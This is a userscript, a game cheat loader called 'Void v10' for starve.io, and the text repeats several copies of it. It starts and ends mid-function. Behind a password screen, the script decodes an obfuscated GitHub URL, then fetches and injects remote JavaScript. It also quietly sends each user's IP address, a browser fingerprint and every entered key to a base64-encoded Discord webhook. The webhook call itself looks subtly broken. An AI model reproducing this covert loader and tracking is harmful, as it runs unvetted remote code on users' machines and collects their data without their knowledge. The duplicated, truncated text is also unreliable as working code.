                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
